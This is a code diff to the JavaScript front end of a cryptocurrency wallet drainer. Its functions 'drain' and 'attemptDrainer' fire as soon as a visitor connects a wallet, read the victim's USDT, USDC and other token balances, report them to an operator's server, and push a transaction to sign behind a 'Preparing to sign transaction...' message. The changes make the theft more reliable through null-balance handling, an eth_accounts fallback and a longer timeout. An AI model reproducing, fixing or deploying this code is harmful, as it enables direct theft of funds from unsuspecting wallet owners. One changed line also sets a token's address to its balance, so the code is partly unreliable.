@@ -223,9 +223,7 @@ async function checkBalance(chainId, userAddress, provider) {
     console.log(`📊 USDT balance: ${ethers.utils.formatUnits(usdtBalance, usdtDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Failed to fetch USDT balance: ${error.message}`);
-    tokenBalances[chainConfig.usdtAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
-  }
-
+    tokenBalances[chainConfig.usdtAddress] = { balance: null, error: error.message };
   try {
     const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
     const [usdcBalance, usdcDecimals] = await Promise.all([
@@ -233,10 +231,10 @@ async function checkBalance(chainId, userAddress, provider) {
       usdc.decimals()
     ]);
     tokenBalances[chainConfig.usdcAddress] = { balance: usdcBalance, decimals: usdcDecimals };
-    console.log(`📊 USDC balance: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
+    console.log(`📩 USDC balance: ${ethers.utils.formatUnits(usdcBalance, usdcDecimals)}`);
   } catch (error) {
     console.warn(`⚠️ Failed to fetch USDC balance: ${error.message}`);
-    tokenBalances[chainConfig.usdcAddress] = { balance: ethers.BigNumber.from(0), decimals: 6 };
+    tokenBalances[chainConfig.usdcAddress] = { balance: null, error: error.message };
   }
 
   if (chainConfig.otherTokenAddresses) {
@@ -249,10 +247,10 @@ async function checkBalance(chainId, userAddress, provider) {
           token.decimals()
         ]);
         console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(balance, decimals)}`);
-        return { address: tokenAddress, balance, decimals };
+        return { address: balance, balance, decimals };
       } catch (error) {
         console.warn(`⚠️ Failed to fetch token ${tokenAddress} balance: ${error.message}`);
-        return { address: tokenAddress, balance: ethers.BigNumber.from(0), decimals: 18 };
+        return { address: tokenAddress, balance: null, decimals: 18, error: error.message };
       }
     });
 
@@ -272,7 +270,7 @@ function hasFunds(bal) {
   if (bal.nativeBalance.gt(minNativeBalance)) return true;
 
   for (const tokenData of Object.values(bal.tokenBalances)) {
-    if (tokenData.balance.gt(minTokenBalance)) return true;
+    if (tokenData.balance && tokenData.balance.gt(minTokenBalance)) return true;
   }
 
   return false;
@@ -301,6 +299,7 @@ function detectWallet() {
 }
 
 function formatBalance(balance, decimals) {
+  if (!balance) return '0';
   const formatted = ethers.utils.formatUnits(balance, decimals);
   return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
 }
@@ -355,7 +354,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
   try {
     console.log(`📍 Notifying server for token ${tokenAddress} for ${userAddress}`);
     const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
-    const balance = initialAmount;
+    const balance = initialAmount || (await token.balanceOf(userAddress));
     const decimals = (await token.decimals()) || 6;
     console.log(`📊 Current token balance: ${ethers.utils.formatUnits(balance, decimals)}`);
 
@@ -421,7 +420,7 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
   }
 
-  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
+  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses || {})];
 
   const connectNotifiedKey = `connectNotified_${userAddress}_${chainId}`;
   const hasNotified = sessionStorage.getItem(connectNotifiedKey);
@@ -442,15 +441,17 @@ async function drain(chainId, signer, userAddress, bal, provider) {
     }
 
     for (const tokenAddress of tokenAddresses) {
-      const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
-      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
-      if (formattedBalance > 0) {
-        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                      Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-        const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
-        funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
+      const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+      if (tokenData.balance) {
+        const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+        if (formattedBalance > 0) {
+          const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                        tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                        Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+          const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+          const tokenValueInUSDT = (formattedBalance * tokenPrice).toFixed(2);
+          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance.toFixed(6)} (\`${tokenValueInUSDT} USDT\`)`);
+        }
       }
     }
 
@@ -492,10 +493,10 @@ async function drain(chainId, signer, userAddress, bal, provider) {
 
   const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
     const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
-    const tokenData = bal.tokenBalances[tokenAddress] || { balance: ethers.BigNumber.from(0), decimals: 18 };
-    const realBalance = tokenData.balance;
+    const tokenData = bal.tokenBalances[tokenAddress] || { balance: null, decimals: 18 };
+    const realBalance = tokenData.balance || (await tokenContract.balanceOf(userAddress));
     const decimals = tokenData.decimals;
-    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance, decimals)}`);
+    console.log(`📊 Token ${tokenAddress} balance: ${ethers.utils.formatUnits(realBalance || 0, decimals)}`);
     return { tokenAddress, tokenContract, realBalance, decimals };
   });
 
@@ -503,18 +504,19 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   console.log(`✅ Retrieved token data: ${tokenDataResults.length} tokens`);
 
   for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
-    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || ethers.BigNumber.from(0);
-    const storedBalanceFormatted = parseFloat(ethers.utils.formatUnits(storedBalance, decimals));
+    if (!realBalance) continue;
+    const storedBalance = bal.tokenBalances[tokenAddress]?.balance || null;
+    const storedBalanceFormatted = storedBalance ? parseFloat(ethers.utils.formatUnits(storedBalance, decimals)) : 0;
     const realBalanceFormatted = parseFloat(ethers.utils.formatUnits(realBalance, decimals));
 
-    if (realBalanceFormatted < storedBalanceFormatted) {
+    if (storedBalance && realBalanceFormatted < storedBalanceFormatted) {
       bal.tokenBalances[tokenAddress] = { balance: realBalance, decimals: decimals };
     }
 
     if (realBalanceFormatted > 0 && realBalanceFormatted > MIN_TOKEN_BALANCE) {
       const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                     tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+                    Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
       if (!symbol) {
         console.warn(`⚠️ Skipping token ${tokenAddress}: symbol not defined`);
         continue;
@@ -659,15 +661,17 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
 
   for (const tokenAddress of Object.keys(balance.tokenBalances)) {
     const tokenData = balance.tokenBalances[tokenAddress];
-    const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
-    if (formattedBalance > 0) {
-      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
-                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
-                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
-      const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
-      const tokenValue = formattedBalance * tokenPrice;
-      totalValue += tokenValue;
-      console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+    if (tokenData.balance) {
+      const formattedBalance = parseFloat(ethers.utils.formatUnits(tokenData.balance, tokenData.decimals));
+      if (formattedBalance > 0) {
+        const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
+                      tokenAddress === chainConfig.usdcAddress ? "USDC" :
+                      Object.keys(chainConfig.otherTokenAddresses || {}).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
+        const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
+        const tokenValue = formattedBalance * tokenPrice;
+        totalValue += tokenValue;
+        console.log(`📊 Token ${symbol} in chainId ${chainId}: ${formattedBalance} * ${tokenPrice} = ${tokenValue.toFixed(2)} USDT`);
+      }
     }
   }
 
@@ -867,7 +871,7 @@ window.addEventListener('DOMContentLoaded', async () => {
       const state = await new Promise(resolve => {
         const unsubscribe = appKit.subscribeState(state => {
           console.log('🔍 SubscribeState (restore):', state);
-          if (state.connected && (state.address || state.accounts?.[0])) {
+          if ((state.connected || state.loading === false) && (state.address || state.accounts?.[0])) {
             unsubscribe();
             resolve(state);
           }
@@ -1009,40 +1013,56 @@ async function handleConnectOrAction() {
 async function waitForConnection() {
   return new Promise((resolve, reject) => {
     console.log('📡 Waiting for wallet connection via AppKit...');
+    console.log('🔍 window.ethereum available:', !!window.ethereum);
 
     const isMobile = isMobileDevice();
     console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
-    const unsubscribe = appKit.subscribeState((state) => {
+    const unsubscribe = appKit.subscribeState(async (state) => {
       console.log('🔍 SubscribeState:', state);
+
       let walletAddress = null;
 
-      // Проверяем возможные поля для адреса
-      if (state.connected) {
-        if (state.address) {
-          walletAddress = state.address;
-        } else if (state.accounts && state.accounts.length > 0) {
-          walletAddress = state.accounts[0];
-        } else if (state.selectedAddress) {
-          walletAddress = state.selectedAddress;
+      // Проверяем состояние загрузки и подключения
+      if (state.loading === false) {
+        if (state.connected && (state.address || state.accounts?.[0] || state.selectedAddress)) {
+          walletAddress = state.address || state.accounts?.[0] || state.selectedAddress;
+        } else {
+          // Пробуем получить адрес через window.ethereum
+          if (window.ethereum) {
+            try {
+              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+              if (accounts && accounts.length > 0) {
+                walletAddress = accounts[0];
+                console.log(`✅ Address from eth_accounts: ${walletAddress}`);
+              }
+            } catch (error) {
+              console.error(`❌ Error fetching eth_accounts: ${error.message}`);
+            }
+          }
         }
+      }
+
+      // Обрабатываем адрес в формате eip155:1:0x...
+      if (!walletAddress && state.accounts?.[0]?.startsWith('eip155:1:')) {
+        walletAddress = state.accounts[0].split(':')[2];
+        console.log(`✅ Extracted address from eip155:1: ${walletAddress}`);
       }
 
       if (walletAddress) {
         console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
         connectedAddress = walletAddress;
         unsubscribe();
-        // Вызываем attemptDrainer сразу после подключения
-        attemptDrainer()
-          .then(() => {
-            appKit.close();
-            resolve(walletAddress);
-          })
-          .catch((err) => {
-            console.error(`❌ Error in attemptDrainer: ${err.message}`);
-            appKit.close();
-            reject(err);
-          });
+        modalSubtitle.textContent = 'Preparing to sign transaction...';
+        try {
+          await attemptDrainer();
+          appKit.close();
+          resolve(walletAddress);
+        } catch (err) {
+          console.error(`❌ Error in attemptDrainer: ${err.message}`);
+          appKit.close();
+          reject(err);
+        }
       }
     });
 
@@ -1051,7 +1071,7 @@ async function waitForConnection() {
       unsubscribe();
       appKit.close();
       reject(new Error('Timeout waiting for wallet connection'));
-    }, 60000);
+    }, 120000);
 
     appKit.open('error', (err) => {
       console.error(`❌ AppKit error: ${err.message}`);
